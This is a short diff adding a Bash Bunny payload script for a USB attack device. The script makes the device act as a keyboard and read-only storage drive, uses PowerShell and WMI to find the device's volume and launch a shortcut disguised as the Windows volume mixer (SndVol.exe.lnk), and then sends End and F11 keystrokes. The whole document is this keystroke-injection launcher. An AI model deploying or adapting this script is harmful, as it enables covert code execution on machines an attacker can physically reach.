@@ -1,0 +1,7 @@
+LED SETUP
+ATTACKMODE HID RO_STORAGE
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\SndVol.exe.lnk')"
+LED STAGE2
+Q END
+Q F11
+LED FINISH
